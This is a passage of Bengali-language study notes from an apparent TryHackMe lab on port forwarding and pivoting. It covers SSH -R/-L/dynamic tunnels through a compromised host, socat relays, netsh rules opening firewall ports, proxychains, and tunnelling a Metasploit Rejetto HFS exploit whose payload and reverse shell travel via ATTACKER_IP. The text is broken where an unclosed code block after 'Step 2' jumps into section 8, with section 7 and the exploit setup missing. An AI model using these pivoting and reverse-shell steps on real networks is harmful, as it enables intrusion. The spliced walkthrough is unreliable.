# **Port Forwarding**

## **1. What is Port Forwarding?**

আগের lateral movement techniques ব্যবহার করতে SMB, RDP, WinRM বা RPC-এর মতো নির্দিষ্ট port accessible থাকা প্রয়োজন।

কিন্তু real network-এ firewall ও network segmentation-এর কারণে এসব port block থাকতে পারে।

এ সমস্যা সমাধানে **Port Forwarding** ব্যবহার করা হয়।

- Compromised host-কে **Jump Box / Pivot Host** হিসেবে ব্যবহার করে অন্য host-এর service access করা যায়।
- Network-এর সব machine-এর permission একরকম নয়। বিভিন্ন কাজের জন্য তাদের আলাদা network access থাকে।

## **2. SSH Tunnelling**

SSH-এর built-in port forwarding feature-কে **SSH Tunnelling** বলে।

Windows-এও OpenSSH client default থাকে, তাই Linux ও Windows উভয় system-এ SSH tunnelling ব্যবহার করা যায়।

### **Example Scenario**

- `PC-1` compromise করা হয়েছে।
- PC-1 থেকে অন্য server-এর একটি port access করা যায়।
- Attacker সরাসরি সেই port access করতে পারে না।
- PC-1 হবে SSH client এবং Attacker PC হবে SSH server।
- Windows machine-এ SSH client পাওয়া গেলেও SSH server সাধারণত পাওয়া যায় না।

<img width="1176" height="381" alt="image" src="https://github.com/user-attachments/assets/bca57efb-192d-4bc4-9810-03e372294bc9" />

**Attacker machine-এ tunnelling user তৈরি:**

```
useradd tunneluser -m -d /home/tunneluser -s /bin/true
passwd tunneluser
```

- `tunneluser`-এর কোনো interactive shell থাকবে না।
- শুধু SSH tunnelling-এর জন্য ব্যবহার হবে।

SSH tunnelling-এর দুটি ধরন:

1. Remote Port Forwarding
2. Local Port Forwarding

## **3. SSH Remote Port Forwarding**

**Remote Port Forwarding** ব্যবহার করে SSH client-এর accessible port-কে SSH server-এর machine-এ expose করা যায়।

### **Example**

- Attacker সরাসরি server-এর `3389` port access করতে পারে না।
- কিন্তু compromised `PC-1` server-এর `3389` access করতে পারে।
- তাই PC-1 দিয়ে port-টি attacker machine-এ forward করা হবে।
- Attacker নিজের machine থেকে RDP connection করতে পারবে।

<img width="1184" height="381" alt="image" src="https://github.com/user-attachments/assets/00a7f95d-a638-438c-bd92-2246060b9428" />

**PC-1 থেকে command:**

```
C:\> ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N
```

**Syntax:**

```
-R [SSH server port]:[destination IP]:[destination port]
```

- `1.1.1.1` → Attacker PC (SSH server)
- `3389` → Attacker PC-তে open হওয়া port
- `3.3.3.3:3389` → যে server-এর port access করতে চাই
- `-R` → Remote port forwarding
- `-N` → Remote shell request করবে না; শুধু tunnel চালু রাখবে।

`tunneluser`-এর shell disabled, তাই `-N` ব্যবহার না করলে connection immediately exit করতে পারে।

Tunnel চালু রাখতে SSH command running থাকতে হবে। বন্ধ করতে `CTRL+C` চাপতে হবে।

**Attacker machine থেকে RDP:**

```
munra@attacker-pc$ xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword
```

**কেন প্রয়োজন?**

PC-1-এ শুধু console access থাকলে GUI/RDP client ব্যবহার করা সম্ভব নাও হতে পারে। Port forward করলে attacker নিজের machine থেকে RDP client বা exploit চালাতে পারে।

## **4. SSH Local Port Forwarding**

**Local Port Forwarding** দিয়ে SSH server-এর accessible port-কে SSH client-এর machine-এ expose করা যায়।

Example:

- Attacker machine-এর port `80` PC-1 থেকে সরাসরি access করা যাচ্ছে না।
- Local forwarding দিয়ে PC-1-এর port `80`-এ attacker machine-এর service available করা হবে।

<img width="1176" height="381" alt="image" src="https://github.com/user-attachments/assets/cc31a33c-e64e-4b60-8b29-d269148150bf" />

**PC-1 থেকে command:**

```
C:\> ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N
```

**Syntax:**

```
-L [local address:port]:[remote address:port]
```

- `-L` → Local port forwarding।
- `*:80` → PC-1-এর port `80`-এ incoming connection গ্রহণ করবে।
- `127.0.0.1:80` → Attacker PC-এর port `80`।
- এখানে `127.0.0.1` attacker machine-এর perspective থেকে বোঝানো হয়েছে।

PC-1-এ নতুন port open হওয়ায় firewall rule প্রয়োজন হতে পারে।

**Firewall rule (Admin privilege প্রয়োজন):**

```
netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
```

এখন অন্য host browser-এ নিচের address দিলে attacker machine-এর website দেখতে পারবে:

```
http://2.2.2.2:80
```

## **5. Port Forwarding With socat**

SSH available না থাকলে `socat` দিয়ে port forwarding করা যায়।

- SSH-এর তুলনায় সহজ, তবে flexibility কম।
- Pivot host-এ `socat` transfer করতে হয়, তাই এটি বেশি detectable হতে পারে।

**Basic syntax:**

```
socat TCP4-LISTEN:1234,fork TCP4:1.1.1.1:4321
```

- Local port `1234`-এ connection listen করবে।
- Connection forward হবে `1.1.1.1:4321`-এ।
- `fork` → প্রতিটি connection-এর জন্য নতুন process তৈরি করবে।
- `fork` না থাকলে প্রথম connection শেষ হলে socat বন্ধ হয়ে যাবে।

<img width="1118" height="272" alt="image" src="https://github.com/user-attachments/assets/24a3ab5d-22e6-4e1a-9c25-f0df56cc60ce" />

### **A. Server-এর RDP Port Access**

**PC-1:**

```
C:\>socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389
```

- PC-1-এর port `3389`-এ listen করবে।
- Connection forward হবে server-এর `3389` port-এ।
- SSH remote forwarding-এর মতো সরাসরি attacker machine-এ port open করে না; PC-1-এ port open করে।

**Firewall rule:**

```
netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389
```

### **B. Attacker-এর Port 80 Expose করা**

**PC-1:**

```
C:\>socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80
```

এখন PC-1-এর port `80`-এ connection এলে attacker machine-এর port `80`-এ forward হবে।

## **6. Dynamic Port Forwarding and SOCKS**

Single port forwarding নির্দিষ্ট port access করার জন্য ভালো।

কিন্তু একাধিক port বা network-এর বিভিন্ন machine scan করতে হলে **Dynamic Port Forwarding** ব্যবহার করা যায়।

- Pivot host দিয়ে SOCKS proxy তৈরি করা হয়।
- এর মাধ্যমে বিভিন্ন IP ও port-এ connection পাঠানো যায়।

**PC-1 থেকে command:**

```
C:\> ssh tunneluser@1.1.1.1 -R 9050 -N
```

- Attacker PC-তে port `9050`-এ SOCKS proxy তৈরি হবে।
- Connection SSH tunnel দিয়ে যাবে।
- SSH client connection-গুলো proxy করবে।

### **Proxychains Configuration**

AttackBox-এ config file:

```
/etc/proxychains.conf
```

শেষের দিকে নিচের configuration থাকবে:

```
[ProxyList]
socks4  127.0.0.1 9050
```

- Default SOCKS port `9050`।
- SSH tunnel-এর port ও proxychains-এর port একই হতে হবে।

**Proxychains দিয়ে command চালানো:**

```
proxychains curl http://pxeboot.za.tryhackme.com
```

**Note:** কিছু ক্ষেত্রে Nmap-এর মতো software SOCKS-এর সঙ্গে ঠিকভাবে কাজ নাও করতে পারে এবং altered result দেখাতে পারে।

### **Problem**

- Attacker machine থেকে সরাসরি THMIIS-এর RDP port `3389` access করা যাচ্ছে না।
- Firewall port-টি block করেছে।
- কিন্তু THMJMP2 থেকে THMIIS-এর port `3389` access করা যায়।

তাই THMJMP2-কে pivot host হিসেবে ব্যবহার করব।

### **Step 1: socat দিয়ে RDP Forward**

THMJMP2-তে `C:\tools\socat\` থেকে:

```
C:\tools\socat\>socat TCP4-LISTEN:13389,fork TCP4:THMIIS.za.tryhackme.com:3389
```

- THMJMP2-এর port `13389` listen করবে।
- Connection THMIIS-এর `3389` port-এ forward হবে।
- `3389` listener হিসেবে ব্যবহার করা যাবে না, কারণ THMJMP2-এর নিজস্ব RDP service ওই port ব্যবহার করছে।
- অন্য শিক্ষার্থীদের সঙ্গে conflict এড়াতে `13389` পরিবর্তন করা যায়।
- সাধারণত firewall rule প্রয়োজন হতে পারে, তবে lab-এ THMJMP2-এর firewall disabled।

### **Step 2: Attacker Machine থেকে RDP**

```

## **8. Tunnelling Complex Exploits**

এই scenario-তে THMDC server-এ vulnerable **Rejetto HFS** চলছে।

সমস্যা:

- Firewall vulnerable port-এ access শুধু THMJMP2 থেকে allow করে।
- THMDC থেকে outbound connection শুধু local network-এর machine-এ allow।
- তাই attacker machine-এ সরাসরি reverse shell পাঠানো যাবে না।
- Rejetto HFS exploit-এর final payload deliver করতে attacker-এর HTTP server প্রয়োজন।
- কিন্তু THMDC attacker machine-এর HTTP server-এ connect করতে পারে না।

Port forwarding দিয়ে এই সমস্যাগুলো সমাধান করা হবে।

### **Exploit কীভাবে কাজ করে?**

1. Exploit প্রথমে HFS port (`RPORT`)-এ connect করে।
2. দ্বিতীয় connection attacker machine-এর `SRVPORT`-এ যায়, যেখানে web server final payload deliver করে।
3. Payload execute হয়ে attacker-এর `LPORT`-এ reverse shell পাঠায়।

### **Required Port Forwarding**

তিনটি port forward করতে হবে:

| Port   | কাজ                                         |
| ------ | ------------------------------------------- |
| `8888` | THMDC-এর port `80` access                   |
| `6666` | Payload deliver করার web server (`SRVPORT`) |
| `7878` | Reverse shell receive (`LPORT`)             |

Lab shared হওয়ায় অন্য শিক্ষার্থীদের সঙ্গে port conflict এড়াতে `6666` ও `7878`-এর পরিবর্তে আলাদা port ব্যবহার করতে হবে।

### **Step 1: Remote Port Forwarding**

THMDC-এর port `80` attacker machine-এর `8888` port-এ forward হবে।

### **Step 2: Local Port Forwarding**

Attacker machine-এর `6666` ও `7878` port THMJMP2-তে expose হবে।

**Complete SSH command:**

THMJMP2: Command Prompt

```
C:\> ssh tunneluser@ATTACKER_IP -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7878:127.0.0.1:7878 -N
```

- `-R 8888:thmdc.za.tryhackme.com:80` → THMDC-এর port `80` attacker machine-এর port `8888`-এ forward।
- `-L *:6666:127.0.0.1:6666` → Attacker-এর web server port `6666` THMJMP2-তে expose।
- `-L *:7878:127.0.0.1:7878` → Attacker-এর reverse shell listener port `7878` THMJMP2-তে expose।
- `-N` → Shell ছাড়া শুধু tunnel চালু রাখে।

**Important:** AttackBox ব্যবহার করলে `ATTACKER_IP` হিসেবে `lateralmovementandpivoting` network-এর tunnel interface IP ব্যবহার করতে হবে।

IP দেখতে:

```
ip add show lateralmovement
```

AttackBox

msf6 exploit(windows/http/rejetto_hfs_exec) > exploit
```

### **Step 4: Configuration বুঝে রাখো**

**1. LHOST ও ReverseListenerBindAddress**

- `LHOST` সাধারণত reverse shell listener-এর IP এবং payload-এ embed হওয়া callback IP—দুই কাজ করে।
- এখানে THMDC সরাসরি attacker machine-এ connect করতে পারবে না।
- তাই payload-কে THMJMP2-তে connect করতে হবে।
- `ReverseListenerBindAddress` দিয়ে attacker machine-এ listener-এর bind address আলাদা করা হয়।
- এখানে listener attacker machine-এর `127.0.0.1`-এ bind হবে।

**2. SRVHOST**

- Exploit-এর web server final payload deliver করবে।
- `SRVHOST` দিয়ে web server-এর listening address নির্ধারণ হয়।
- এখানে `127.0.0.1` দেওয়া হয়েছে।
- SSH tunnel-এর মাধ্যমে THMJMP2-এর port `6666` থেকে attacker machine-এর localhost-এ connection forward হবে।

**3. RHOSTS ও RPORT**

- `RHOSTS = 127.0.0.1` → SSH tunnel-এর মাধ্যমে request THMDC-তে যাবে।
- `RPORT = 8888` → Attacker machine-এর port `8888` forward হয়ে THMDC-এর port `80`-এ পৌঁছাবে।

Exploit successful হলে attacker machine-এ shell পাওয়া যাবে।

## **Quick Revision**

| Technique          | ব্যবহার                                          |
| ------------------ | ------------------------------------------------ |
| SSH Remote (`-R`)  | SSH client-এর reachable port SSH server-এ expose |
| SSH Local (`-L`)   | SSH server-এর service SSH client-এ expose        |
| `socat`            | Simple TCP port forwarding                       |
| Dynamic Forwarding | SOCKS proxy দিয়ে একাধিক IP/port access           |
| `proxychains`      | SOCKS proxy দিয়ে tools চালানো                    |

**মনে রাখবে:**

- `-R` → Remote port forwarding।
- `-L` → Local port forwarding।
- `-N` → Remote shell request না করে tunnel চালু রাখা।
- `fork` → socat-এ একাধিক connection handle করা।
- SOCKS → Dynamic port forwarding।
- `proxychains` → SOCKS proxy দিয়ে command চালানো।
- Pivot host → Compromised machine, যেটি দিয়ে অন্য network resource access করা হয়।
